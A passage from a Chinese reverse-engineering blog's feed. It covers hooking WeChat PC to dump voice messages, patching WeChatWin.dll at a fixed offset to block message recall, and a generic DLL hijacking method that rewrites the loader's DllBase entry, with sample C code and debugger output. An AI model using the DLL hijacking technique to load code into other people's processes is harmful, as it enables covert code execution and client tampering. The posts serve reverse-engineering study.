class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">//聊天列表框信息</span><br><span class="line"></span><br><span class="line">struct chat_list_msg &#123;</span><br><span class="line">DWORD unk;//</span><br><span class="line">wstring wxid;//</span><br><span class="line">//wchar_t* wxid;//4</span><br><span class="line">//int len;//8</span><br><span class="line">//int maxlen;//c</span><br><span class="line">DWORD unk1;//10</span><br><span class="line">DWORD unk2;//14</span><br><span class="line">wstring name;</span><br><span class="line">//wchar_t* name;//18微信名</span><br><span class="line">//int len;//1c</span><br><span class="line">//int maxlen;//20</span><br><span class="line">…</span><br><span class="line">wstring msg; //</span><br><span class="line">//wchar_t* msg;//3c</span><br><span class="line">//int len;//</span><br><span class="line">//int maxlen;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>wstring msg字段就是文字消息内容，而语音消息则是预览中看到的[语音]两字，并没有实际能够听到的语音数据，所以还得继续往前找。</p> <p><img src="/img/wx2/image015.png" alt="img"></p> <p>继续往上回溯了3层左右，进入了102DDC50，找到了语音消息的新信息。</p> <p><img src="/img/wx2/image017.png" alt="img"></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">struct msg_xx</span><br><span class="line">&#123;</span><br><span class="line">char unk[0x40];//</span><br><span class="line">wstring wxid1;//40</span><br><span class="line">wstring wxid2;//4c</span><br><span class="line">char unk1[0x10];//58</span><br><span class="line">wstring msg;//68</span><br><span class="line">char unk2[0x10];//74</span><br><span class="line">;//84</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>在wstring msg处就是普通文字消息内容，而语音消息并不是我想象的就是直接语音的数据，而是…如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;msg&gt;&lt;voicemsg endflag=&quot;1&quot; cancelflag=&quot;0&quot; forwardflag=&quot;0&quot; voiceformat=&quot;4&quot; voicelength=&quot;1176&quot; length=&quot;1334&quot; bufid=&quot;147445261304397871&quot; clientmsgid=&quot;416261363964373964444633636200230013013119fdd53b1f494102&quot; fromusername=&quot;wxid_xxxxxxxxx&quot; /&gt;&lt;/msg&gt;</span><br></pre></td></tr></table></figure> <p>真是一波三折，还不是语音的数据，而是关于语音信息的xml，有语音的大小，来自谁，在语音缓冲区中的id（bufid）等等信息。</p> <p>继续往前找呗，最后回溯到了所有消息处理的分发函数10323FF0中。这个函数处理逻辑很复杂，我并没有很快就找到如何生成语音消息的xml，以及处理语音数据的函数。</p> <p>一度卡住，重复分析了很多次。</p> <p>后来又回神想到了逆向神器IDA，xml中数据如voicemsg肯定是模块中会在代码中用到，看看有没有有用的信息。</p> <p>用IDA打开Wechatwin.dll，shift+F12分析出所有字符串，Ctrl+F找到关键字voicemsg，看来有戏。</p> <p><img src="/img/wx2/image019.png" alt="img"></p> <p>真的是柳暗花明又一村。</p> <p>点击字符串跳到代码窗口，按下x，跳到引用该数据的位置。</p> <p><img src="/img/wx2/image021.png" alt="img"></p> <p>找到了解析语音xml数据和解码语音数据的关键函数。</p> <p><img src="/img/wx2/image023.png" alt="img"></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">f_parseVoiceXmlInfo_103148E0</span><br><span class="line">text:103149DD 0E4 0F 84 74 02 00 00                             jz      loc_10314C57</span><br><span class="line">.text:103149E3 0E4 68 D0 06 F0 10                                push    offset aVoicemsg ; &quot;voicemsg&quot;</span><br><span class="line">.text:103149E8 0E8 8B CF                                         mov     ecx, edi</span><br><span class="line">.text:103149EA 0E8 E8 31 28 3E 00                                call    f_xml_subnode_106F7220</span><br><span class="line">.text:103149EF 0E4 85 C0                                         test    eax, eax</span><br><span class="line">.text:103149F1 0E4 0F 84 60 02 00 00                             jz      loc_10314C57</span><br><span class="line">.text:103149F7 0E4 8D 70 2C                                      lea     esi, [eax+2Ch]</span><br><span class="line">.text:103149FA 0E4 68 C4 06 F0 10                                push    offset aClientmsgid ; &quot;clientmsgid&quot;</span><br><span class="line">.text:103149FF 0E8 8B CE                                         mov     ecx, esi</span><br><span class="line">.text:10314A01 0E8 E8 CA 3A 3E 00                                call    f_xml_getvalue_106F84D0</span><br></pre></td></tr></table></figure> <p>函数103148E0解析xml拿到几个字段的内容，返回上层函数调用一个语音解码的函数进行处理，而这个解码函数就会直接操作语音数据。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(*(void (__thiscall **)(int *, _DWORD, _DWORD, int *, signed int))(*v7</span><br><span class="line">                                                                            + 28))(//</span><br><span class="line">             v7,</span><br><span class="line">             *(_DWORD *)(voice_msg + 48),      // 语音内容</span><br><span class="line">             *(_DWORD *)(voice_msg + 52),      // 语音长度</span><br><span class="line">             v17,</span><br><span class="line">             v4);</span><br></pre></td></tr></table></figure> <p>函数103148E0回溯再看看，进入了分发函数10323FF0中，在一个循环中处理了多种流程，包括显示界面最新消息的流程和解码语音的流程。所以前面找的方向并没有问题，只是缺少认真分析数据和代码的耐心。</p> <p>不过，目的都达到了，找到了数据处理函数，最后通过hook这个函数就能拿到语音数据。</p> <p>另外可以看到语音数据中包含SILK_V3的字符，这种编码音频格式是Skpye曾经使用的一种编码方式，后来开源了。目前播放器并不能直接播放该编码音频文件，所以需要转码为MP3等格式。不过可喜的是已经有大佬完成了这个工作，并开源了工具silk-v3-decoder。所以把代码拿来整合一下，就可以完整的实现实时dump语音聊天数据，转换为mp3进行保存，完美。</p> <p><img src="/img/wx2/image025.png" alt="img"></p> <h3 id="0x3-总结"><a href="#0x3-总结" class="headerlink" title="0x3. 总结"></a>0x3. 总结</h3><p>这是第一次比较成功的应用CE，整个看来，确实省下来很多定位数据和函数的工作。</p> <p>但CE并不是万能的，要找对方法，找对目标数据才可能成功，对于某些没有明显数据的功能，可能也是无能为力。</p> <p>最终还是得提高对大型软件的逆向能力，总体实现思路的猜测以及调试验证。</p> <p>最后，时间仓促，目前只是将保存语音的demo更新到到SuperWeChatPC项目中，后续会持续更新，欢迎关注。</p> <p>转载请注明出处：<a href="https://anhkgg.com/wechat-voice/" target="_blank" rel="noopener">https://anhkgg.com/wechat-voice/</a></p> ]]></content>          <summary type="html">            &lt;p&gt;欢迎关注技术公众号：&lt;strong&gt;&lt;span style=&quot;color:red&quot;&gt;汉客儿&lt;/span&gt;&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;/img/wx.png&quot; alt=&quot;img&quot;&gt;&lt;/p&gt; &lt;blockquote&gt; &lt;p&gt;微信PC端技术研究-保存聊天语音&lt;br&gt;by anhkgg（公众号：汉客儿）&lt;br&gt;2019年1月31日&lt;/p&gt; &lt;/blockquote&gt; &lt;h3 id=&quot;0x0-前言&quot;&gt;&lt;a href=&quot;#0x0-前言&quot; class=&quot;headerlink&quot; title=&quot;0x0. 前言&quot;&gt;&lt;/a&gt;0x0. 前言&lt;/h3&gt;&lt;p&gt;虽然一直知道CE，也用过一段时间，但一直用不好，可能太笨。&lt;/p&gt; &lt;p&gt;最近又学习了某位大佬用CE的方法，大佬的一句话有点醍醐灌顶，然后有了新的感觉，然后开始尝试实践这篇文章。&lt;/p&gt; &lt;p&gt;自己总结一下CE用法的核心思路：通过各种技巧搜索找到内存中关键数据，然后结合动态调试找到操作数据的函数。&lt;/p&gt; &lt;p&gt;准备工具：Cheat Engine，OllyDbg，IDA。&lt;/p&gt;          </summary>            <category term="security" scheme="https://anhkgg.github.io/categories/security/"/>                 <category term="reverse" scheme="https://anhkgg.github.io/tags/reverse/"/>            <category term="wechat" scheme="https://anhkgg.github.io/tags/wechat/"/>        </entry>      <entry>     <title>微信PC端技术研究-消息防撤销</title>     <link href="https://anhkgg.github.io/wechat-revoke/"/>     <id>https://anhkgg.github.io/wechat-revoke/</id>     <published>2018-12-01T03:32:27.000Z</published>     <updated>2019-03-09T01:51:45.286Z</updated>          <content type="html"><![CDATA[<p>欢迎关注技术公众号：<strong><span style="color:red">汉客儿</span></strong><br><img src="/img/wx.png" alt="img"></p> <blockquote> <p>微信PC端技术研究-消息防撤销<br>by anhkgg<br>2018年11月30日</p> </blockquote> <h2 id="0x1-写在前面"><a href="#0x1-写在前面" class="headerlink" title="0x1. 写在前面"></a>0x1. 写在前面</h2><p>不知道大家有没有遇到过这种情况，微信收到消息，但是没有及时查看，然后闲暇时去看的时候，消息被撤销了，撤销了！</p> <p>那时肯定是无比无语，挠心挠肺，究竟发了什么？</p> <p>有没有一种神器可以防消息撤销呢，有的！其实移动端和mac上已经有人做了相关的插件，但是PC端貌似没人来啃这块骨头。</p> <p>当然也可能是我没找到，不过不管怎样，对我来说就是没有。</p> <p>既然如此，小生来！</p> <a id="more"></a> <h2 id="0x2-技术分析"><a href="#0x2-技术分析" class="headerlink" title="0x2. 技术分析"></a>0x2. 技术分析</h2><p>先理一下思路：</p> <p>1.对方发送消息之后，我收到消息并在消息窗口显示<br><br>2.然后对方点击菜单选择撤销<br><br>3.我会收到发来的撤销通知，然后删除消息窗口显示的消息</p> <p>所以分析方向就基本定为两个方向了：</p> <p>1.一个是通过分析网络消息找到撤销消息，然后拦截该消息阻止消息被撤销<br><br>2.另一个是找到撤销消息的界面操作，patch掉这个撤销消息的操作即可</p> <p>开始之前，先了解一下微信主要模块都实现什么功能。</p> <table> <thead> <tr> <th>模块</th> <th>功能</th> </tr> </thead> <tbody> <tr> <td>WeChat.exe</td> <td>主程序，初始化操作，加载WeChatWin.dll</td> </tr> <tr> <td>WeChatWin.dll</td> <td>主要功能模块，包括界面、网络、功能</td> </tr> <tr> <td>wechatresource.dll</td> <td>保存资源的模块，包括界面资源</td> </tr> </tbody> </table> <p>主要分析目标就是WeChatWin.dll，其实很早之前就想分析这个东西了，但是那时候的老版本vmp壳加的更严重（映像中是，无法考证），所以搁置很久。</p> <p>当前我分析的版本应该是最新的<code>2.6.5.38</code>，目前来看加壳程度还行，基本都是比较好分析的代码，没有经过加壳处理，不过听说核心代码还是处理过的。</p> <h3 id="1-界面入手"><a href="#1-界面入手" class="headerlink" title="1. 界面入手"></a>1. 界面入手</h3><p>首先试试从界面入手，都知道微信界面使用duilib实现的，所以可以从它的某些特征入手分析，比如字符串<code>click</code>等，可以快速找到功能函数。</p> <p>想的是通过<code>click</code>找到整个窗口响应函数，然后再分析找到撤销操作的代码位置。</p> <p>确实很快就看到了窗口响应函数，不过大概有119个相关函数，所以无奈放弃。</p> <p>换一个方向，通过菜单入手，搜索<code>menu</code>找到<code>menuCmdDelete</code>，<code>menuCmdRevoke</code>等字符串，<code>menuCmdRevoke</code>就是撤销菜单对应的名字。有29个相关函数，还行。结合调试，尝试了几个函数，果然找到了删除、撤销对应的响应函数。然后想通过删除菜单来找到删除界面消息的代码，而被撤销消息其实也是删除界面消息，不过折腾了一圈未果。</p> <h3 id="2-网络入手"><a href="#2-网络入手" class="headerlink" title="2. 网络入手"></a>2. 网络入手</h3><p>通过<code>recv</code>回溯到接收网络消息的函数中，40个，有点多。找了个tcp抓包工具，想抓到撤销消息的调用堆栈，结果一直被其他消息干扰，无果。</p> <h3 id="3-取巧"><a href="#3-取巧" class="headerlink" title="3. 取巧"></a>3. 取巧</h3><p>函数太多，分析很费实践，想看看有没有其他路可以走。在字符串中搜索<code>revoke</code>发现很多看起来有用的调试信息，不过也有79条之多。然后通过筛选和调试确认，找到了<code>On RevokeMsg svrId : %d</code>，然后回溯到撤销消息处理的函数中。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if ( sub_10247BF0((wchar_t *)v258, (int)v259, (int)v260, v261) )</span><br><span class="line">&#123;                             // 撤销消息</span><br><span class="line">*(_OWORD *)&amp;v259 = xmmword_10E6A278;</span><br><span class="line">v257 = xmmword_10E6A278;</span><br><span class="line">v256 = xmmword_10E6A278;</span><br><span class="line">v255 = xmmword_10E6A278;</span><br><span class="line">*(_OWORD *)&amp;v251 = xmmword_10E6A278;</span><br><span class="line">sub_1007E090(&amp;v247, v353, SHIDWORD(v353));</span><br><span class="line">f_log_10471580(</span><br><span class="line">  (int)&quot;02_manager\\SyncMgr.cpp&quot;,</span><br><span class="line">  2,</span><br><span class="line">  1357,</span><br><span class="line">  (int)&quot;SyncMgr::doAddMsg&quot;,</span><br><span class="line">  (int)&quot;SyncMgr&quot;,</span><br><span class="line">  &quot;On RevokeMsg svrId : %d&quot;,</span><br></pre></td></tr></table></figure> <p>经过调试发现<code>sub_10247BF0</code>返回1则进入撤销消息处理中，消息被撤销，跳过此段代码，消息不会被撤销，所以patch掉<code>sub_10247BF0</code>这个函数的返回值使其一直为0即可完成防撤销的功能。</p> <p>当然也不能太随意了，还是看看这个函数大概做了些什么处理吧。关键参数第一个，调试中发现值如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;sysmsg type=&quot;revokemsg&quot;&gt;</span><br><span class="line">    &lt;revokemsg&gt;</span><br><span class="line">        &lt;session&gt;wxid_0811111140112&lt;/session&gt;</span><br><span class="line">        &lt;msgid&gt;1111000048&lt;/msgid&gt;</span><br><span class="line">        &lt;newmsgid&gt;11411701182813217&lt;/newmsgid&gt;</span><br><span class="line">        &lt;replacemsg&gt;&lt;![CDATA[&quot;xxx&quot; 撤回了一条消息]]&gt;&lt;/replacemsg&gt;</span><br><span class="line">    &lt;/revokemsg&gt;</span><br><span class="line">&lt;/sysmsg&gt;</span><br></pre></td></tr></table></figure> <p><code>sub_10247BF0</code>解析发现<code>type=&quot;revokemsg&quot;</code>即判断为撤销消息操作，返回1，很明了。</p> <p><strong>小结</strong>：此次分析运气较好，通过revoke找到关键代码，少花了很多时间，其实通过网络方向堆栈筛选确认应该也是可以找到这段代码的，但是通过结果去看，发现有近10层调用栈，肯定会花成倍的时间才能找到关键代码。</p> <h2 id="0x3-实现"><a href="#0x3-实现" class="headerlink" title="0x3. 实现"></a>0x3. 实现</h2><p>分析是为了最后能够用起来，所以用上一篇文章《一种通用Dll劫持技术》写了一个简单的包含patch代码（没有用hook）的dll模块，劫持微信的WeChatResource.dll来完成加载。</p> <p>关键代码如下所示，patch了<code>sub_10247BF0</code>返回值所在代码，让其eax永远为0。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">bool FakeRevokeMsg()</span><br><span class="line">&#123;</span><br><span class="line"> if (!IsSupportedWxVersion()) &#123;</span><br><span class="line">  return false;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> //33 C0                xor eax,eax </span><br><span class="line"> BYTE code[] = &#123; 0x33, 0xc0, 0x90 &#125;;</span><br><span class="line"> HMODULE hMod = GetModuleHandle(WECHATWINDLL);</span><br><span class="line"> DWORD offset = 0x247EF1;//返回值处</span><br><span class="line"> if (!hMod) &#123;</span><br><span class="line">  return false;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> PVOID addr = (BYTE*)hMod + offset;</span><br><span class="line"> Patch(addr, 3, code);</span><br><span class="line"></span><br><span class="line"> return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>最后惯例，放上github地址：<a href="https://github.com/anhkgg/SuperWeChatPC" target="_blank" rel="noopener">https://github.com/anhkgg/SuperWeChatPC</a></p> <p>转载请注明出处：<a href="https://anhkgg.com/wechat-revoke" target="_blank" rel="noopener">https://anhkgg.com/wechat-revoke</a></p> <p>公众号文章链接：<a href="https://mp.weixin.qq.com/s/E7N6LzAH4p88Gu4f_qwGlg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/E7N6LzAH4p88Gu4f_qwGlg</a></p> <p>欢迎关注公众号：<strong>汉客儿</strong>或加入QQ交流群：<strong>753894145</strong></p> ]]></content>          <summary type="html">            &lt;p&gt;欢迎关注技术公众号：&lt;strong&gt;&lt;span style=&quot;color:red&quot;&gt;汉客儿&lt;/span&gt;&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;/img/wx.png&quot; alt=&quot;img&quot;&gt;&lt;/p&gt; &lt;blockquote&gt; &lt;p&gt;微信PC端技术研究-消息防撤销&lt;br&gt;by anhkgg&lt;br&gt;2018年11月30日&lt;/p&gt; &lt;/blockquote&gt; &lt;h2 id=&quot;0x1-写在前面&quot;&gt;&lt;a href=&quot;#0x1-写在前面&quot; class=&quot;headerlink&quot; title=&quot;0x1. 写在前面&quot;&gt;&lt;/a&gt;0x1. 写在前面&lt;/h2&gt;&lt;p&gt;不知道大家有没有遇到过这种情况，微信收到消息，但是没有及时查看，然后闲暇时去看的时候，消息被撤销了，撤销了！&lt;/p&gt; &lt;p&gt;那时肯定是无比无语，挠心挠肺，究竟发了什么？&lt;/p&gt; &lt;p&gt;有没有一种神器可以防消息撤销呢，有的！其实移动端和mac上已经有人做了相关的插件，但是PC端貌似没人来啃这块骨头。&lt;/p&gt; &lt;p&gt;当然也可能是我没找到，不过不管怎样，对我来说就是没有。&lt;/p&gt; &lt;p&gt;既然如此，小生来！&lt;/p&gt;          </summary>            <category term="security" scheme="https://anhkgg.github.io/categories/security/"/>                 <category term="wechat" scheme="https://anhkgg.github.io/tags/wechat/"/>            <category term="anti-revoke" scheme="https://anhkgg.github.io/tags/anti-revoke/"/>        </entry>      <entry>     <title>一种通用Dll劫持技术研究</title>     <link href="https://anhkgg.github.io/dllhijack/"/>     <id>https://anhkgg.github.io/dllhijack/</id>     <published>2018-11-29T09:45:46.000Z</published>     <updated>2019-03-09T01:52:13.107Z</updated>          <content type="html"><![CDATA[<p>欢迎关注技术公众号：<strong><span style="color:red">汉客儿</span></strong><br><img src="/img/wx.png" alt="img"></p> <blockquote> <p>通用DLL劫持技术研究<br><br>by anhkgg<br><br>2018年11月29日<br></p> </blockquote> <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>Dll劫持相信大家都不陌生，理论就不多说了。Dll劫持的目的一般都是为了自己的dll模块能够在别人进程中运行，然后做些不可描述的事情。</p> <p>为了让别人的程序能够正常运行，通常都需要在自己的dll中导出和劫持的目标dll相同的函数接口，然后在自己的接口函数中调用原始dll的函数，如此使得原始dll的功能能够正常被使用。导出接口可以自己手工写，也可以通过工具自动生成，比如著名的<code>Aheadlib</code>。这种方法的缺点就是针对不同的dll需要导出不同的接口，虽然有工具帮助，但也有限制，比如不支持x64。</p> <a id="more"></a> <p>除此之外，很早之前就知道一种通用dll劫持的方法，原理大致是在自己的dll的dllmian中加载被劫持dll，然后修改loadlibrary的返回值为被劫持dll加载后的模块句柄。这种方式就是自己的dll不用导出和被劫持dll相同的函数接口，使用更加方便，也更加通用。</p> <p>下面就尝试分析一下如何实现这种通用的dll劫持方法。</p> <h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>随便写一个测试代码：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">//mydll.dll 伪造的用于劫持mydll.dll的dll代码</span><br><span class="line">//mydll.dll.1是把test.exe加载的原始dll修改为这个名字</span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">                     )</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        __debugbreak();</span><br><span class="line">        HMODULE hmod = LoadLibraryW(&quot;mydll.dll.1&quot;);</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br><span class="line">//test.exe</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    LoadLibraryW(L&quot;mydll.dll&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>用windbg加载看看堆栈，如下所示。在test中通过LoadLibraryW加载mydll.dll，最后进入mydll!DllMain。现在需要分析系统映射dll之后是如何把基地址返回给LoadLibraryW，然后才能想办法把这个值给修改成加载mydll.dll.1的值。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; kvn</span><br><span class="line"> # ChildEBP RetAddr  Args to Child              </span><br><span class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</span><br><span class="line">00 0025eaf8 6e4112ec 6e410000 00000000 00000000 mydll+0x101d</span><br><span class="line">01 0025eb38 6e4113c9 6e410000 00000001 00000000 mydll+0x12ec</span><br><span class="line">02 0025eb4c 77d889d8 6e410000 00000001 00000000 mydll!DllMain+0x13</span><br><span class="line">03 0025eb6c 77d95c41 6e4113ad 6e410000 00000001 ntdll!LdrpCallInitRoutine+0x14</span><br><span class="line">04 0025ec60 77d9052e 00000000 74e92d11 77d77c9a ntdll!LdrpRunInitializeRoutines+0x26f (FPO: [Non-Fpo])</span><br><span class="line">05 0025edcc 77d9232c 0025ee2c 0025edf8 00000000 ntdll!LdrpLoadDll+0x4d1 (FPO: [Non-Fpo])</span><br><span class="line">06 0025ee00 75ee88ee 0037429c 0025ee40 0025ee2c ntdll!LdrLoadDll+0x92 (FPO: [Non-Fpo])</span><br><span class="line">07 0025ee38 761b3c12 00000000 00000000 00000001 KERNELBASE!LoadLibraryExW+0x15a (FPO: [Non-Fpo])</span><br><span class="line">08 0025ee4c 6848e3f5 0025ee58 003a0043 0055005c kernel32!LoadLibraryW+0x11 (FPO: [Non-Fpo])</span><br><span class="line">09 0025f068 6848d1de d9131536 00000000 00000000 test!start+0x2b5</span><br><span class="line">0a 0025f09c 6848e245 013a0000 761b3c26 76b3ea5f test!start+0x21e86e</span><br><span class="line">0b 0025f328 013a1918 013a0000 0037187a 00000000 test!start+0x105</span><br><span class="line">0c 0025fb44 013a30b9 013a0000 00000000 0037187a test+0x1918</span><br><span class="line">0d 0025fb90 761b3c45 7ffd9000 0025fbdc 77d937f5 test+0x30b9</span><br><span class="line">0e 0025fb9c 77d937f5 7ffd9000 74e93b01 00000000 kernel32!BaseThreadInitThunk+0xe (FPO: [Non-Fpo])</span><br><span class="line">0f 0025fbdc 77d937c8 013a312b 7ffd9000 00000000 ntdll!__RtlUserThreadStart+0x70 (FPO: [Non-Fpo])</span><br><span class="line">10 0025fbf4 00000000 013a312b 7ffd9000 00000000 ntdll!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo])</span><br></pre></td></tr></table></figure> <p>先去reactos翻看一下，找到如下的函数调用结构。在LdrLoadDll参数中BaseAddress就是最后返回给LoadLibraryW的值，所以继续看BaseAddress是如何赋值的。BaseAddress继续传给LdrpLoadDll，在LdrpLoadDll中，首先通过LdrpMapDll映射dll模块，返回一个LdrEntry的LDR_DATA_TABLE_ENTRY结构，保存了dll加载的基址、大小、名字等信息。接着LdrEntry会插入到peb-&gt;ldr链表结构中，然后调用LdrpRunInitializeRoutines，在LdrpRunInitializeRoutines中最终会调用DllMain，此处不继续深入分析。最后LdrEntry-&gt;DllBase赋值给BaseAddress。到此流程分析清楚，下面考虑如何修改这个值。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS</span><br><span class="line">NTAPI</span><br><span class="line">LdrLoadDll(IN PWSTR SearchPath OPTIONAL,</span><br><span class="line">           IN PULONG DllCharacteristics OPTIONAL,</span><br><span class="line">           IN PUNICODE_STRING DllName,</span><br><span class="line">           OUT PVOID *BaseAddress) &#123;</span><br><span class="line">               Status = LdrpLoadDll(RedirectedDll,</span><br><span class="line">                         SearchPath,</span><br><span class="line">                         DllCharacteristics,</span><br><span class="line">                         DllName,</span><br><span class="line">                         BaseAddress,</span><br><span class="line">                         TRUE);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS</span><br><span class="line">NTAPI</span><br><span class="line">LdrpLoadDll(IN BOOLEAN Redirected,</span><br><span class="line">            IN PWSTR DllPath OPTIONAL,</span><br><span class="line">            IN PULONG DllCharacteristics OPTIONAL,</span><br><span class="line">            IN PUNICODE_STRING DllName,</span><br><span class="line">            OUT PVOID *BaseAddress,</span><br><span class="line">            IN BOOLEAN CallInit)</span><br><span class="line">            &#123;</span><br><span class="line">                Status = LdrpMapDll(DllPath,</span><br><span class="line">                            DllPath,</span><br><span class="line">                            NameBuffer,</span><br><span class="line">                            DllCharacteristics,</span><br><span class="line">                            FALSE,</span><br><span class="line">                            Redirected,</span><br><span class="line">                            &amp;LdrEntry);</span><br><span class="line"></span><br><span class="line">                 //插入peb-&gt;ldr链表</span><br><span class="line"></span><br><span class="line">                Status = LdrpRunInitializeRoutines(NULL);</span><br><span class="line"></span><br><span class="line">                if (NT_SUCCESS(Status))</span><br><span class="line">                &#123;</span><br><span class="line">                    /* Return the base address */</span><br><span class="line">                    *BaseAddress = LdrEntry-&gt;DllBase;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;    </span><br><span class="line"></span><br><span class="line">LdrpRunInitializeRoutines-&gt; LdrpCallInitRoutine -&gt; DllMain</span><br></pre></td></tr></table></figure> <p>记得映像中的那种方法，是通过堆栈回溯到LdrpLoadDll中，找到LdrEntry进行修改（不确实是否准备，时间久远了），但因为LdrEntry是局部变量，不同系统可以不一样，兼容性差一些。但看到这个调用流程之后，其实还有另一种方式。LdrEntry-&gt;DllBase赋值给BaseAddress，那么在赋值之前把这个LdrEntry-&gt;DllBase修改了即可，在DllMain正好是修改的时机，但是不需要使用堆栈回溯的方式。因为LdrEntry已经插入到peb-&gt;ldr中，那么在DllMain中可以直接获取peb-&gt;ldr遍历链表找到目标dll堆栈的LdrEntry就是需要修改的LdrEntry，然后修改即可。</p> <p>不过这个分析都是基于reactos来的，还是需要确认一下真是windows系统的ntdll是如何首先的。</p> <p>在win7 